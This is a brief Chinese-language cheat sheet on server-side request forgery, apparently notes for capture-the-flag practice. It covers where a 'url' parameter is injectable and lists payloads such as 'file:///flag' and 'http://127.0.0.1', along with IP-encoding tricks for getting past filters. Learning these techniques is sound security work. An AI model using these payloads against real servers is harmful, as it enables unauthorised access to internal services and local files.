```sh
SSRF（服务端请求伪造）:核心目标是让服务器去访问它内部才能访问的资源（通常是 127.0.0.1）
#注入点
输入框或一个带有 ?url= 参数的链接,说明后端程序会接收你输入的 URL，并代表服务器去请求该地址
#验证
尝试输入 http://www.baidu.com。如果页面返回了百度的内容，说明 SSRF 漏洞存在
#payload
?url=file:///flag		#file协议
?url=http://127.0.0.1

#绕过方式
127.0.0.1 ->  2130706433	#IP 十进制转换
127.0.0.1 ->  localhost
127.0.0.1 ->  127。0。0。1	  #服务器可能会还原为.
```
